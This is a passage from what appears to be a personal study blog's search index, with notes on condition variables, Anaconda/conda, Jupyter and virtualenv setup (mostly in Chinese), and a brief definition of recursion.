<li><code>cv_wait</code>: notify me when the buffer has data in it.</li>
<li><p><code>cv_signal</code>: I just put data in the buffer, so notify the threads that are waiting for the buffer to have data.</p>
</li>
<li><p><strong>Condition variable</strong> can convey <strong>more information</strong> than locks about some change to the state of the world.</p>
</li>
</ul>
<p>As an example, a buffer can be <strong>full</strong>, <strong>empty</strong>, or <strong>neither</strong>.</p>
<ul>
<li>If the buffer is <strong>full</strong>, we can let threads withdraw but not add items.</li>
<li>If the buffer is <strong>empty</strong>, we can let threads add but not withdraw items.</li>
<li>If the buffer is neither full nor empty, we can let threads add and withdraw items.</li>
</ul>
<p>We have <strong>three</strong> different buffer states (full, empty, or neither) and <strong>two</strong> different threads (producer, consumer).</p>
<p>Why are condition variables a synchronization mechanism?</p>
<ul>
<li>Want to ensure that the condition <strong>does not change</strong> between checking it and deciding to wait!</li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/condition_variable.png" alt="condition_variable"></p>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p>[1] <a href="https://stackoverflow.com/questions/8017507/definition-of-synchronization-primitive">https://stackoverflow.com/questions/8017507/definition-of-synchronization-primitive</a><br>[2] <a href="https://baike.baidu.com/item/原语/3794081?fr=aladdin">https://baike.baidu.com/item/原语/3794081?fr=aladdin</a></p>
]]></content>
      
        <categories>
            
            <category> OS </category>
            
            <category> CSE521 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> OS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python配置]]></title>
      <url>/wiki/2017/03/30/TOOLS-Python%E9%85%8D%E7%BD%AE/</url>
      <content type="html"><![CDATA[<h1 id="Anaconda"><a href="#Anaconda" class="headerlink" title="Anaconda"></a>Anaconda</h1><p><a href="https://www.continuum.io/why-anaconda">Anaconda </a>(/ˌænə’kɑndə/)是一个用于科学计算的python发行版，支持各种系统，提供了包管理和环境管理的功能。Anaconda 利用<code>conda</code>来进行package和environment的管理。</p>
<h2 id="Conda的包管理"><a href="#Conda的包管理" class="headerlink" title="Conda的包管理"></a>Conda的包管理</h2><p><code>Conda</code>既是一个工具，也是一个可执行命令，其核心功能是包管理和环境管理。包管理与<code>pip</code>使用类似。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装package</span></span><br><span class="line">conda install package</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看已经安装的packages</span></span><br><span class="line">conda list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找package信息</span></span><br><span class="line">conda search package</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新package</span></span><br><span class="line">conda update -n python27 package</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除package</span></span><br><span class="line">conda remove -n python27 package</span><br></pre></td></tr></table></figure>
<h2 id="Conda的环境管理"><a href="#Conda的环境管理" class="headerlink" title="Conda的环境管理"></a>Conda的环境管理</h2><p>Conda可以创建/激活/删除某一个环境。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个名为python27的环境，指定Python版本是2.7</span></span><br><span class="line">conda create --name python27 python=2.7</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装好后，使用activate激活某个环境</span></span><br><span class="line"><span class="built_in">source</span> activate python27 <span class="comment"># 激活后，会发现terminal输入的地方多了python27的字样，实际上，此时系统做的事情就是把默认环境从PATH中去除，再把2.7对应的命令加入PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果想返回python 2.7环境，运行</span></span><br><span class="line"><span class="built_in">source</span> deactivate python27 <span class="comment"># for Linux &amp; Mac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除一个已有的环境</span></span><br><span class="line">conda remove --name python27 --all</span><br></pre></td></tr></table></figure>
<h2 id="使用Requirement-txt-安装"><a href="#使用Requirement-txt-安装" class="headerlink" title="使用Requirement.txt 安装"></a>使用Requirement.txt 安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while read requirement; do conda install --yes $requirement; done &lt; requirements.txt</span><br></pre></td></tr></table></figure>
<h2 id="使用Pycharm"><a href="#使用Pycharm" class="headerlink" title="使用Pycharm"></a>使用Pycharm</h2><p>在<code>Pycharm</code>配置里选用<code>Anaconda</code>的<code>python</code>编译器所在位置即可。 使用Jupyter notebook时，点击Run Cell，它会弹出提示框，要求输入token。接下来在Terminal里运行Jupyter Notebook，就会出现如下结果： </p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/PyCharmJupyterNotebook.png" alt="PyCharmJupyterNotebook"></p>
<p>拷贝token以后的字符串到提示框，等待连接完成。</p>
<p>如果已经有jupyter notebook在运行，而且你忘了token的话，可以输入<code>jupyter notebook list</code>查询当前运行的notebook。</p>
<h2 id="Jupyter-NoteBook"><a href="#Jupyter-NoteBook" class="headerlink" title="Jupyter NoteBook"></a>Jupyter NoteBook</h2><p><code>Anaconda</code>默认自带<code>Jupyter Notebook</code>，可以很方便的运行Python代码、记录笔记。在terminal输入<code>jupyter note book</code>，会自动新建浏览器页面，也就是notebook。</p>
<h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h3><p><code>Jupyter Notebook</code>的<a href="[https://github.com/dunovank/jupyter-themes">主题</a>可以调整，首先安装主题:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade jupyterthemes</span><br></pre></td></tr></table></figure>
<p>选择好主题后，切换主题:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jt -t theme_name -T -N</span><br></pre></td></tr></table></figure>
<h2 id="Bash-Kernel"><a href="#Bash-Kernel" class="headerlink" title="Bash Kernel"></a>Bash Kernel</h2><p><code>Bash kernel</code>(<a href="https://github.com/takluyver/bash_kernel">Project Link</a>)可以通过pip安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install bash_kernel</span><br><span class="line">python -m bash_kernel.install</span><br></pre></td></tr></table></figure>
<h2 id="Install-Python2-3-Kernel"><a href="#Install-Python2-3-Kernel" class="headerlink" title="Install Python2/3 Kernel"></a>Install Python2/3 Kernel</h2><p>Install install with</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install ipykernel</span><br><span class="line">python3 -m ipykernel install --user</span><br></pre></td></tr></table></figure>
<h2 id="在PyCharm中配置anaconda的解释器"><a href="#在PyCharm中配置anaconda的解释器" class="headerlink" title="在PyCharm中配置anaconda的解释器"></a>在PyCharm中配置anaconda的解释器</h2><p>选择project interpreter, 接着点击 project interpreter 的右边的小齿轮，选择 add local ，选择anaconda文件路径下的python。接着PyCharm会更新解释器，导入模块等，要稍等一点时间。</p>
<h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><p><a href="https://conda.io/docs/_downloads/conda-cheatsheet.pdf">Conda Cheat Sheet</a></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li><a href="https://ipython.readthedocs.io/en/latest/install/kernel_install.html">Installing the IPython kernel</a></li>
</ul>
<h1 id="Python-virtualenv"><a href="#Python-virtualenv" class="headerlink" title="Python virtualenv"></a>Python <code>virtualenv</code></h1><h2 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h2><p>Install <code>virtualenv</code> using <code>conda</code> instead of <code>pip</code>, because it might raise error (see on <a href="virtualenv --no-site-packages venv">StackOverflow</a>)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda install virtualenv</span><br></pre></td></tr></table></figure>
<h2 id="create-your-environment"><a href="#create-your-environment" class="headerlink" title="create your environment"></a>create your environment</h2><p>Now you can create your python environment for your particular programs. For example, under the folder <code>your project</code>, you create an environment called <code>.venv</code> by:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virtualenv --no-site-packages .venv</span><br></pre></td></tr></table></figure>
<p>The command <code>--no-site-packages</code> requires the environment should not access to global site-packages (as default now).</p>
<p>Before running your program in your created environment, you need to activate it:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source .venv/bin/activate</span><br></pre></td></tr></table></figure>
<p>And remember to deactivate it whenever you are done:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> TOOLS </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Recursion]]></title>
      <url>/wiki/2017/01/30/Algorithm-Recursion/</url>
      <content type="html"><![CDATA[<p>来自 Problem Solving with Algorithm and Data Structures Using Python，Release 3.0, Chapter 4, Page 117 学习笔记。</p>
<h3 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h3><p><strong>Recursion</strong> is a method of solving problems that involves breaking a problem down into smaller and smaller subproblems until you get into a small enough problem that it can be solved trivially. Usually recursion involves a function calling itself.</p>
<p>A recursive function is a function that calls itself.</p>
<h3 id="The-Three-Laws-of-Recursion"><a href="#The-Three-Laws-of-Recursion" class="headerlink" title="The Three Laws of Recursion"></a>The Three Laws of Recursion</h3><ul>
<li>A recursive algorithm must have a base case.</li>
<li>A recursive algorithm must change its state and move toward the base case.</li>
<li>A recursive algorithm must call, recursively</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Algorithm </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Recursion </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
